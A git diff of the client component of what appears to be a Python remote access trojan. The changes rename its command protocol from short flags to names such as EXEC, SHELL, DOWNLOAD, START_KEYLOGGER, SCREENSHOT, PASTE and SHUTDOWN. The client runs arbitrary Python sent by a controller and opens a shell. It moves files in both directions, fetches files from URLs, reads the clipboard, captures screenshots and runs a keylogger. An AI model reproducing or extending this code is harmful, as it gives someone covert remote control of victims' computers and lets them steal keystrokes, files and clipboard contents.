@@ -172,6 +172,11 @@ def kill(proc_pid):
     process.kill()
 
 
+def json_dumps(data):
+    """ Dumps json data and encodes it """
+    return json.dumps(data).encode()
+
+
 def json_loads(data):
     """ Decodes and then loads json data """
     return json.loads(data.decode())
@@ -317,58 +322,62 @@ class Client(object):
             # data[2]: data2
             # ...
 
+            if data[0] == 'LOG_FILE':
+                self.send(LOG.encode())
+                continue
+
+            if data[0] == '<PLATFORM>':
+                self.send(platform.system().encode())
+                continue
+
             if data[0] == '<INFO>':
                 self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                 continue
 
-            if data[0] == '--i':
-                self.send(b'<READY>')
-                while 1:
-                    command = self.receive().decode()
-                    if command == '<QUIT>':
-                        self.send(b'Quitting Python Interpreter...')
-                        break
-                    old_stdout = sys.stdout
-                    redirected_output = sys.stdout = StringIO()
-                    try:
-                        exec(command)
-                        error = None
-                    except Exception as e:
-                        error = errors(e, line=False)
-                    finally:
-                        sys.stdout = old_stdout
-                    self.send(json.dumps([redirected_output.getvalue(), error]).encode())
+            if data[0] == 'EXEC':
+                old_stdout = sys.stdout
+                redirected_output = sys.stdout = StringIO()
+                try:
+                    exec(data[1])
+                    error = None
+                except Exception as e:
+                    error = errors(e, line=False)
+                finally:
+                    sys.stdout = old_stdout
+                self.send(json_dumps([redirected_output.getvalue(), error]))
                 continue
 
-            if data[0] == '--x':
-                if data[1] == '1':
-                    self.send(b'Restarting Session...')
-                    break
-                if data[1] == '2':
-                    self.send(b'Disconnecting Client...')
-                    self.socket.close()
-                    sys.exit(0)
+            if data[0] == 'RESTART_SESSION':
+                self.send(json_dumps([True]))
+                break
 
-            if data[0] == '--q':
-                if data[1] == '1':
-                    if platform.system() == 'Windows':
-                        self.send(b'Locked Client Machine')
-                        ctypes.windll.user32.LockWorkStation()
-                    else:
-                        self.send(b'Desktop Locking is only avaliable on Windows Clients.')
-                    continue
-                elif data[1] == '2':
-                    if platform.system() == 'Windows':
-                        subprocess.Popen('shutdown /s /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    else:
-                        subprocess.Popen('shutdown -h now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                elif data[1] == '3':
-                    if platform.system() == 'Windows':
-                        subprocess.Popen('shutdown /r /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                    else:
-                        subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            if data[0] == 'DISCONNECT':
+                self.send(json_dumps([True]))
+                self.socket.close()
+                sys.exit(0)
+
+            if data[0] == 'LOCK':
+                if platform.system() == 'Windows':
+                    self.send(json_dumps([True]))
+                    ctypes.windll.user32.LockWorkStation()
+                else:
+                    self.send(json_dumps([False]))
+                continue
+
+            if data[0] == 'SHUTDOWN':
+                if platform.system() == 'Windows':
+                    subprocess.Popen('shutdown /s /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                else:
+                    subprocess.Popen('shutdown -h now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 time.sleep(5)
-                # If shutdowns or restarts didn't work
+                break
+
+            if data[0] == 'RESTART':
+                if platform.system() == 'Windows':
+                    subprocess.Popen('shutdown /r /t 0', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                else:
+                    subprocess.Popen('reboot now', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                time.sleep(5)
                 break
 
             if data[0] == 'LIST':
@@ -379,38 +388,38 @@ class Client(object):
                 self.send(b'<DONE>')
                 continue
 
-            if data[0] == '--r':
+            if data[0] == 'RECEIVE FILE':
                 self.send_file(data[1])
                 continue
 
-            if data[0] == '--s':
+            if data[0] == 'SEND FILE':
                 self.receive_file(data[1])
                 continue
 
-            if data[0] == '--d':
+            if data[0] == 'DOWNLOAD':
                 try:
                     r = requests.get(data[1])
                     with open(data[2], 'wb') as f:
                         f.write(r.content)
                 except Exception as e:
-                    self.send('Error downloading file: {}\n'.format(errors(e, line=False)).encode())
+                    self.send(json_dumps([False, errors(e, line=False)]))
                     continue
-                self.send(b'Download Successful')
+                self.send(json_dumps([True, None]))
                 continue
 
-            if data[0] == '--c':
+            if data[0] == 'COPY':
                 try:
                     pyperclip.copy(data[1])
-                    self.send(b'Copied Successfully')
+                    self.send(json_dumps([True, None]))
                 except Exception as e:
-                    self.send(errors(e).encode())
+                    self.send(json_dumps([False, errors(e)]))
                 continue
 
-            if data[0] == '--u':
+            if data[0] == 'INFO':
                 self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                 continue
 
-            if data[0] == '--g':
+            if data[0] == 'SCREENSHOT':
                 if platform.system() == 'Windows':
                     _file = '{}\\temp.png'.format(os.environ['TEMP'])
                 else:
@@ -422,57 +431,51 @@ class Client(object):
                     self.receive()
                     self.send(errors(e).encode())
                     continue
-                with open(_file, 'rb') as f:
-                    self.send(f.read())
+                self.send(_file.encode())
+                self.receive_commands()
                 os.remove(_file)
                 continue
 
-            if data[0] == '--k start':
+            if data[0] == 'START_KEYLOGGER':
                 if not _pynput:
-                    self.send(b'Keylogger is disabled due to import error.')
+                    self.send(json_dumps([False]))
                     continue
                 if not KeyListener.running:
                     KeyListener.start()
                     logging.info('Started Keylogger')
-                    self.send(b'Started Keylogger\n')
+                self.send(json_dumps([True]))
+                continue
+            
+            if data[0] == 'KEYLOGGER_STATUS':
+                if not _pynput or not KeyListener.running:
+                    self.send(json_dumps([False]))
                     continue
-                self.send(b'Keylogger already running\n')
+                self.send(json_dumps([True]))
                 continue
 
-            if data[0] == '--l':
-                self.send_file(LOG)
-                with open(LOG, 'w') as f:
-                    f.write('')
-                logging.info('Dumped Logs.')
-                # Logs keylogger state
-                if KeyListener.running:
-                    logging.info('Started Keylogger')
-                continue
-
-            if data[0] == '--k stop':
+            if data[0] == 'STOP_KEYLOGGER':
                 if not _pynput:
-                    self.send(b'Keylogger is disabled due to import error.')
+                    self.send(json_dumps([False]))
+                    continue
                 if KeyListener.running:
                     logging.info('Stopped Keylogger')
                     KeyListener.stop()
                     threading.Thread.__init__(KeyListener) # re-initialise thread
-                    self.send(b'Keylogger Stopped')
-                    continue
-                self.send(b'Keylogger not running')
+                self.send(json_dumps([True]))
                 continue
 
-            if data[0] == '--p':
+            if data[0] == 'PASTE':
                 try:
-                    self.send(pyperclip.paste().encode())
+                    self.send(json_dumps([True, pyperclip.paste()]))
                 except Exception as e:
-                    self.send(errors(e).encode())
+                    self.send(json_dumps([False, errors(e)]))
                 continue
 
             if data[0] == '<GETCWD>':
                 self.send(os.getcwdb())
                 continue
 
-            if data[0] == '--e':
+            if data[0] == 'SHELL':
                 if data[1] == 'cd':
                     self.send(os.getcwdb())
                     continue
